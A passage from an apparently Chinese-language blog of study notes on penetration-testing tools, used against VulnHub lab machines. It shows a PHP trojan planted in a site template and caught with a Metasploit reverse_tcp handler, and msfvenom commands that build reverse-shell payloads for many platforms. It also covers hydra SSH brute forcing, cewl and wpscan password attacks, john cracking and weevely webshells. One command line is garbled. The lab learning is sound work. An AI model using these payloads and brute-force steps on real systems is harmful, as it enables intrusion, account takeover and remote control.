<p><img src="/2022/05/31/daily/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>然后在网站新建一个php文件</p>
<p><img src="/2022/05/31/daily/image-20220903221140645.png" alt="image-20220903221140645"></p>
<p>然后把木马内容导入进去</p>
<p><img src="/2022/05/31/daily/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p>然后保存一下</p>
<p><img src="/2022/05/31/daily/image-20220903221238918.png" alt="image-20220903221238918"></p>
<p>然后试试能不能访问木马</p>
<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
<p>因为我们文件是在<code>/templates/protostar/less/</code>下上传的，所以访问</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar<span class="regexp">/less/</span><span class="number">1</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903221336853.png" alt="image-20220903221336853"></p>
<p>看到/*，看来是可以成功访问</p>
<h6 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h6><p>然后用msf进行利用</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">先输入msfconsole，进入msf</span><br></pre></td></tr></table></figure>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">然后输入</span><br><span class="line">use exploit<span class="regexp">/multi/</span>handler</span><br><span class="line"></span><br><span class="line">set payload php<span class="regexp">/meterpreter/</span>reverse_tcp</span><br><span class="line">进入我们利用msf制作的木马利用环境</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903220102252.png" alt="image-20220903220102252"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">看看需要填写什么</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>看到LHOST监听的ip没有填写</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span> //<span class="comment">kali</span>的<span class="comment">ip</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">run</span>，运行，会卡住</span><br></pre></td></tr></table></figure></div>

<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903223414089.png" alt="image-20220903223414089"></p>
<p>后面操作不赘述</p>
<h5 id="msfvenom-—list-archs"><a href="#msfvenom-—list-archs" class="headerlink" title="msfvenom —list archs"></a>msfvenom —list archs</h5><p>#查看支持的系统架构</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">aarch<span class="number">64</span><span class="punctuation">,</span> armbe<span class="punctuation">,</span> armle<span class="punctuation">,</span> cbea<span class="punctuation">,</span> cbea<span class="number">64</span><span class="punctuation">,</span> cmd<span class="punctuation">,</span> dalvik<span class="punctuation">,</span> firefox<span class="punctuation">,</span> java<span class="punctuation">,</span> mips<span class="punctuation">,</span> mips<span class="number">64</span><span class="punctuation">,</span> mips<span class="number">64</span>le<span class="punctuation">,</span> mipsbe<span class="punctuation">,</span> mipsle<span class="punctuation">,</span> nodejs<span class="punctuation">,</span> php<span class="punctuation">,</span> ppc<span class="punctuation">,</span> ppc<span class="number">64</span><span class="punctuation">,</span> ppc<span class="number">64</span>le<span class="punctuation">,</span> ppce<span class="number">500</span>v<span class="number">2</span><span class="punctuation">,</span> python<span class="punctuation">,</span> r<span class="punctuation">,</span> ruby<span class="punctuation">,</span> sparc<span class="punctuation">,</span> sparc<span class="number">64</span><span class="punctuation">,</span> tty<span class="punctuation">,</span> <span class="keyword">x</span><span class="number">64</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span><span class="punctuation">,</span> zarch</span><br></pre></td></tr></table></figure></div>

<h5 id="msfvenom-—list-platforms"><a href="#msfvenom-—list-platforms" class="headerlink" title="msfvenom —list platforms"></a>msfvenom —list platforms</h5><p>#查看支持系统平台</p>
<pre><code>aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, juniper, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows



msfvenom -l payload #列出所有可用的payload

msfvenom -l formats #列出所有的输出格式

msfvenom -l encrypt #列出所有的加密方式

msfvenom -l encoders #列出所有的编码器
</code></pre>
<h5 id="常见生成格式"><a href="#常见生成格式" class="headerlink" title="常见生成格式"></a>常见生成格式</h5><h6 id="1、-Windows"><a href="#1、-Windows" class="headerlink" title="1、 Windows"></a>1、 Windows</h6><pre><code>msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe
</code></pre>
<h6 id="2、Linux"><a href="#2、Linux" class="headerlink" title="2、Linux"></a>2、Linux</h6><pre><code>msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elfxxxxxxxxxx msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1
</code></pre>
<h6 id="3、Mac"><a href="#3、Mac" class="headerlink" title="3、Mac"></a>3、Mac</h6><pre><code>msfvenom --platform osx -a x86 -p osx/x86/shell_reverse_tcp -f macho -o payload.macho
</code></pre>
<h6 id="4、Android"><a href="#4、Android" class="headerlink" title="4、Android"></a>4、Android</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp -o payload.apk</span><br></pre></td></tr></table></figure></div>

<h6 id="5、Aspx"><a href="#5、Aspx" class="headerlink" title="5、Aspx"></a>5、Aspx</h6><pre><code>msfvenom --platform windows-p windows/meterpreter/reverse_tcp -f aspx -o payload.aspx
</code></pre>
<h6 id="6、JSP"><a href="#6、JSP" class="headerlink" title="6、JSP"></a>6、JSP</h6><pre><code>msfvenom --platform java -p java/jsp_shell_reverse_tcp -f raw -o payload.jsp
</code></pre>
<h6 id="7、PHP"><a href="#7、PHP" class="headerlink" title="7、PHP"></a>7、PHP</h6><pre><code>msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php
</code></pre>
<h6 id="8、BASH"><a href="#8、BASH" class="headerlink" title="8、BASH"></a>8、BASH</h6><pre><code>msfvenom -p cmd/unix/reverse_bash -f raw -o shell.sh
</code></pre>
<h6 id="9、Python"><a href="#9、Python" class="headerlink" title="9、Python"></a>9、Python</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">msfvenom -<span class="keyword">p</span> <span class="keyword">python</span>/meterpreter/reverse_tcp -<span class="keyword">f</span> raw -<span class="keyword">o</span> <span class="keyword">shell</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure></div>



<h5 id="Msfvenom常用命令参数"><a href="#Msfvenom常用命令参数" class="headerlink" title="Msfvenom常用命令参数"></a>Msfvenom常用命令参数</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">-l, <span class="comment">--list &lt;type&gt; </span></span><br><span class="line"><span class="comment"># 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span></span><br><span class="line">-p, <span class="comment">--payload &lt;payload&gt; </span></span><br><span class="line"><span class="comment"># 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line"><span class="comment">--list-options </span></span><br><span class="line"><span class="comment"># 列出--payload &lt;value&gt; 的标准，高级和规避选项</span></span><br><span class="line">-f, <span class="comment">--format &lt;format&gt; </span></span><br><span class="line"><span class="comment"># 指定 Payload 的输出格式(使用 --list formats 列出)</span></span><br><span class="line">-e, <span class="comment">--encoder &lt;encoder&gt; </span></span><br><span class="line"><span class="comment"># 指定使用的 Encoder (使用 --list encoders 列出)</span></span><br><span class="line"><span class="comment">--sec-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span></span><br><span class="line"><span class="comment">--smallest </span></span><br><span class="line"><span class="comment"># 使用所有可用的编码器生成最小的payload</span></span><br><span class="line"><span class="comment">--encrypt &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span></span><br><span class="line"><span class="comment">--encrypt-key &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 用于加密的密钥</span></span><br><span class="line"><span class="comment">--encrypt-iv &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 加密的初始化向量</span></span><br><span class="line">-<span class="keyword">a</span>, <span class="comment">--arch &lt;arch&gt; </span></span><br><span class="line"><span class="comment"># 指定目标系统架构(使用 --list archs 列出)</span></span><br><span class="line"><span class="comment">--platform &lt;platform&gt; </span></span><br><span class="line"><span class="comment"># 指定目标系统平台 (使用 --list platforms 列出)</span></span><br><span class="line">-o, <span class="comment">--out &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 保存payload文件</span></span><br><span class="line">-b, <span class="comment">--bad-chars &lt;list&gt; </span></span><br><span class="line"><span class="comment"># 设置需要在 Payload 中避免出现的字符，如： &#x27;\x00\xff&#x27;</span></span><br><span class="line">-n, <span class="comment">--nopsled &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 指定 nop 在 payload 中的数量</span></span><br><span class="line">-s, <span class="comment">--space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 设置未经编码的 Payload 的最大长度</span></span><br><span class="line"><span class="comment">--encoder-space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 编码后的 Payload 的最大长度</span></span><br><span class="line">-i, <span class="comment">--iterations &lt;count&gt; </span></span><br><span class="line"><span class="comment"># 设置 Payload 的编码次数</span></span><br><span class="line">-c, <span class="comment">--add-code &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line">-x, <span class="comment">--template &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 指定一个特定的可执行文件作为模板</span></span><br><span class="line">-k, <span class="comment">--keep </span></span><br><span class="line"><span class="comment"># 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line">-v, <span class="comment">--var-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span></span><br><span class="line">-t, <span class="comment">--timeout &lt;second&gt; </span></span><br><span class="line"><span class="comment"># 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span></span><br><span class="line">-h, <span class="comment">--help </span></span><br><span class="line"><span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure></div>



<h3 id="2）hydra"><a href="#2）hydra" class="headerlink" title="2）hydra"></a>2）hydra</h3><p><code>hydra是一个自动化的爆破工具,暴力破解弱密码,是一个支持众多协议的爆破工具</code></p>
<p><strong>这里以vulnhub dc1为例</strong></p>
<p>用了hydra[海德拉]工具，对flag4用户进行爆破</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是</span><br><span class="line">用户所在的网站</span><br><span class="line"></span><br><span class="line">上面-p的文件是kali自带的密码包，当然也可以用其他的</span><br><span class="line"></span><br><span class="line">-s 端口</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>这里就看到flag4用户的密码被爆破出来，是orange</p>
<p>然后用ssh连接</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">然后yes</span><br><span class="line">然后输入密码：orange</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830211817515.png" alt="image-20220830211817515"></p>
<h3 id="3）cewl"><a href="#3）cewl" class="headerlink" title="3）cewl"></a>3）cewl</h3><p> <code>Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。Cewl是通过ruby编写,通过爬取网站并提取独立的单词保存为字典,可以和John the Ripper等工具配合使用。</code></p>
<p><code>主要还是根据网站自身的关键词，然后生成的字典，比如cewl，flag等等</code></p>
<p><strong>这里以vulnhub dc2为例</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">-w等同于&gt;   <span class="regexp">//</span>写入</span><br><span class="line">-m n       <span class="regexp">//</span>至少生成的长度为n，默认是<span class="number">3</span></span><br><span class="line">-d x       <span class="regexp">//</span>生成更大的字典，默认x=<span class="number">2</span></span><br></pre></td></tr></table></figure></div>



<p>我们用<code>cewl</code>试试生成字典</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入cewl http:<span class="regexp">//</span>dc-<span class="number">2</span>/ &gt;pass.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>目录下就会生成<code>pass.txt</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> pass.txt，查看内容</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>发现是生成对应网站的密码字典</p>
<h3 id="4）wpscan"><a href="#4）wpscan" class="headerlink" title="4）wpscan"></a>4）wpscan</h3><p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
<p><strong>这里以vulnhub dc2为例</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">wpscan -url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br><span class="line"></span><br><span class="line">-e u    <span class="regexp">//</span>枚举用户信息</span><br><span class="line"></span><br><span class="line">wpscan -url xx -P xx -U xx</span><br><span class="line">-P passwdspath  <span class="regexp">//</span>密码字典路径，或者直接写</span><br><span class="line">-U userspath    <span class="regexp">//</span>用户名字典路径，或者直接写</span><br></pre></td></tr></table></figure></div>



<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>然后往下看用户名</p>
<p><img src="/2022/05/31/daily/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">输入vi un.txt,把admin <span class="keyword">jerry </span>tom复制进去</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>稍微等一会</p>
<p><img src="/2022/05/31/daily/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p>admin用户密码没有找到，应该是最高权限的账号</p>
<p>但是jerry和tom用户的密码知道了</p>
<h3 id="5）John"><a href="#5）John" class="headerlink" title="5）John"></a>5）John</h3><p>John是一个破解系统密码的工具</p>
<p>使用很简单</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">john --show passwd.txt<span class="regexp">//</span>后面接的是密码文本文件</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>就可以看到明文为<code>snoopy</code></p>
<h3 id="6）weevely"><a href="#6）weevely" class="headerlink" title="6）weevely"></a>6）weevely</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Weevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c/s模式 构建,可以算作是linux下的一款php菜刀替代工具</span><br></pre></td></tr></table></figure></div>

<p>生成Shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VERILOG"><figure class="iseeu highlight /verilog"><table><tr><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;文件名&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure></div>

<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
<p>利用触发shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220904133118746.png" alt="image-20220904133118746"></p>
<p>成功进入shell</p>
]]></content>
      <categories>
        <category>知识点笔记</category>
      </categories>
  </entry>
</search>
